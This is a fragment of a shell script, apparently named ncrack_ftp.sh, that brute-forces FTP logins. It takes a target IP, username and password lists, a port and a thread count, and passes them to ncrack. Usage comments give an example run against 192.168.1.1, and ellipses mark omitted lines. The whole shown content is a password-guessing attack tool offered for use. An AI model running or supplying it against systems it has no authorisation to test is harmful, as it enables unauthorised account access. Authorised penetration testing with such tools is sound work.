...
# Usage: ncrack_ftp.sh <target_ip> <username_list> <password_list> <port> <threads>
# Example script
# ncrack_ftp.sh 192.168.1.1 usernames.txt passwords.txt 21 4
...
ncrack -U $USERLIST -P $PASSLIST -p ftp://$TARGET:$PORT -T $THREADS
